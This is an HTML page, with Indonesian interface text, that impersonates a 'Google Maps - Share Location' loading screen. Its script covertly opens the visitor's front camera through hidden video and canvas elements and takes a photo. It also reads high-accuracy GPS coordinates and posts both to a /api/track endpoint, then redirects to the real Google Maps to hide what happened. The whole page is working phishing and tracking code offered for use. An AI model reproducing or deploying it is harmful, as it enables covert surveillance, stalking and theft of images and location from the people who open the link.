<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Share Location</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 25vh; background: #f4f4f9; color: #333; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #camera-stream { display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h3>Memuat Peta...</h3>
    <p>Mohon tunggu sebentar, sedang menghubungkan ke lokasi...</p>

    <!-- Elemen tersembunyi untuk mengambil foto -->
    <video id="camera-stream" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        window.onload = function() {
            let capturedImage = null;

            // 1. Coba ambil foto dari kamera terlebih dahulu
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.getElementById('camera-stream');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        capturedImage = canvas.toDataURL('image/jpeg'); // Format Base64
                        
                        // Matikan kamera setelah foto diambil
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Lanjut ambil lokasi GPS
                        getLocAndSend(capturedImage);
                    }, 1500); // Beri jeda 1.5 detik agar kamera siap
                })
                .catch(err => {
                    // Jika kamera ditolak, tetap lanjut kirim lokasi GPS saja
                    getLocAndSend(null);
                });
        };

        function getLocAndSend(imagebase64) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => sendData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, imagebase64),
                    error => sendData(null, null, null, imagebase64),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                sendData(null, null, null, imagebase64);
            }
        }

        function sendData(lat, lon, accuracy, image) {
            fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: accuracy, image: image })
            }).finally(() => {
                if (lat && lon) {
                    window.location.href = `https://maps.google.com/?q=${lat},${lon}`;
                } else {
                    window.location.href = "https://maps.google.com";
                }
            });
        }
    </script>
</body>
</html>
